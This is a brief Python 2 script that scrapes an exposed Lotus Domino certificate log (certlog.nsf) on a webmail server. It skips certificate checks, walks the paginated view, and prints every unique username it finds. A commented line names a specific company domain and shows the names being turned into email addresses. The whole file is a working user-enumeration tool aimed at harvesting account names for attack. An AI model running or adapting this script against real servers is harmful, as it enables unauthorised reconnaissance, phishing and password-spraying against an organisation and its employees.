from lxml import html
import httplib
from urlparse import urlparse
import requests,sys

url = "https://webmail.xxxx.com/certlog.nsf"


page = requests.get(url,verify=False)
if "Certificate Log" not in page.text:
	print "[!] Please check URL"
else:
#domainName = "carnivalaustralia.com"
	page = requests.get(url,verify=False)
	tree = html.fromstring(page.text)
	path = elements = tree.xpath('/html/body/ul/li[3]/a/@href')
	hostname = urlparse(url).hostname
	scheme = urlparse(url).scheme
	startUrl = scheme+"://"+hostname+path[0]

	nameList=[]
	count=1
	while True:
		url = startUrl+"&Start="+str(count)+"&ExpandView"
		#print url
		page = requests.get(url,verify=False)
		tree = html.fromstring(page.text)
		elements = tree.xpath('//tr/td//text()')
		if len(elements)>5:
			counter=0
			for i in elements:
				if counter%5==0:
					username = i.replace(", ",".")
					if username not in nameList:
						if "/" not in username and username!='Previous':
							nameList.append(username)
							print username
							#print username+"@"+domainName
				counter+=1
		elif len(elements)==0:
			sys.exit()
		count+=30
